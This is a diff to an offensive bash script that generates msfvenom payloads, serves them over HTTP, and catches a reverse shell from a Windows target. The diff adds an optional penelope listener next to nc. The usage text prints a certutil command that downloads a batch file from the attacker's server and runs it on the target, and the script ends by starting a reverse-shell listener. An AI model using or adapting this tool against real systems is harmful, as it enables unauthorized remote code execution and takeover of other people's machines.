@@ -18,16 +18,30 @@ LPORT_HTTP=8005
 PAYLOAD_NAME="update"
 HTTP_PID=""
 WORKDIR=""
+USE_PENELOPE=false
+
+# ---------- Pre-process long options ----------
+# getopts does not support --long-opts, so we translate them before parsing.
+ARGS=()
+for arg in "$@"; do
+    case "$arg" in
+        --penelope) USE_PENELOPE=true ;;
+        *)          ARGS+=("$arg") ;;
+    esac
+done
+set -- "${ARGS[@]+"${ARGS[@]}"}"
 
 # ---------- Usage ----------
 usage() {
     cat <<USAGE
-Usage: $0 -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>]
+Usage: $0 -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>] [--penelope]
 
-  -i  Your attacker machine IP (LHOST)
-  -p  Port to receive the reverse shell on (LPORT)
-  -w  HTTP server port used to serve the payloads (default: 8005)
-  -h  Show this help message
+  -i           Your attacker machine IP (LHOST)
+  -p           Port to receive the reverse shell on (LPORT)
+  -w           HTTP server port used to serve the payloads (default: 8005)
+  --penelope   Use penelope as the reverse shell listener instead of nc
+               (penelope must be installed and in PATH)
+  -h           Show this help message
 
 Target architecture (x86/x64) is auto-detected:
   - get-script.ps1 uses [Environment]::Is64BitOperatingSystem
@@ -46,7 +60,7 @@ Commands to run on the target:
   WITHOUT PowerShell (CMD only):
     certutil -urlcache -split -f "http://LHOST:HTTP_PORT/get-script.bat" "%TEMP%\\get-script.bat" && "%TEMP%\\get-script.bat"
 
-Requirements: msfvenom, python3, nc
+Requirements: msfvenom, python3, nc (or penelope with --penelope)
 USAGE
     exit 1
 }
@@ -58,15 +72,22 @@ banner() {
     local sep
     sep=$(printf '═%.0s' $(seq 1 $width))
     local title_pad=$(( (width - ${#title}) / 2 ))
+    local listener_label
+    if [[ "$USE_PENELOPE" == true ]]; then
+        listener_label="penelope"
+    else
+        listener_label="nc"
+    fi
     printf "\n  ╔%s╗\n" "$sep"
     printf "  ║%*s%s%*s║\n" \
         "$title_pad" "" "$title" \
         $(( width - title_pad - ${#title} )) ""
     printf "  ║  %-*s║\n" $(( width - 2 )) ""
-    printf "  ║  %-*s║\n" $(( width - 2 )) "LHOST : ${LHOST}"
-    printf "  ║  %-*s║\n" $(( width - 2 )) "LPORT : ${LPORT}  (reverse shell)"
-    printf "  ║  %-*s║\n" $(( width - 2 )) "HTTP  : ${LPORT_HTTP}"
-    printf "  ║  %-*s║\n" $(( width - 2 )) "ARCH  : auto-detect (x86 + x64)"
+    printf "  ║  %-*s║\n" $(( width - 2 )) "LHOST    : ${LHOST}"
+    printf "  ║  %-*s║\n" $(( width - 2 )) "LPORT    : ${LPORT}  (reverse shell)"
+    printf "  ║  %-*s║\n" $(( width - 2 )) "HTTP     : ${LPORT_HTTP}"
+    printf "  ║  %-*s║\n" $(( width - 2 )) "ARCH     : auto-detect (x86 + x64)"
+    printf "  ║  %-*s║\n" $(( width - 2 )) "LISTENER : ${listener_label}"
     printf "  ╚%s╝\n\n" "$sep"
 }
 
@@ -97,6 +118,22 @@ while getopts "i:p:w:h" opt; do
 done
 
 [[ -z "${LHOST:-}" || -z "${LPORT:-}" ]] && usage
+
+# ---------- Validate listener ----------
+if [[ "$USE_PENELOPE" == true ]]; then
+    if ! command -v penelope >/dev/null 2>&1; then
+        echo "[-] --penelope specified but penelope is not installed or not in PATH."
+        echo "[-] Install it from: https://github.com/brightio/penelope"
+        echo "[-] Or run without --penelope to use nc instead."
+        exit 1
+    fi
+else
+    if ! command -v nc >/dev/null 2>&1; then
+        echo "[-] nc (netcat) is not installed or not in PATH."
+        echo "[-] Install it or use --penelope if you have penelope available."
+        exit 1
+    fi
+fi
 
 # ---------- Paths ----------
 WORKDIR="$(mktemp -d /tmp/aie.XXXXXX)"
@@ -372,5 +409,10 @@ echo
 # No stty raw — the remote shell is a TCP socket, not a PTY.
 # The local terminal's default line-buffering (sends on Enter) is exactly
 # what the line-buffered read loop in revshell_ps.ps1 expects.
-echo "[*] Starting listener on port ${LPORT}..."
-nc -lvnp "$LPORT" || true
+if [[ "$USE_PENELOPE" == true ]]; then
+    echo "[*] Starting listener on port ${LPORT} (penelope)..."
+    penelope -p "$LPORT" || true
+else
+    echo "[*] Starting listener on port ${LPORT} (nc)..."
+    nc -lvnp "$LPORT" || true
+fi
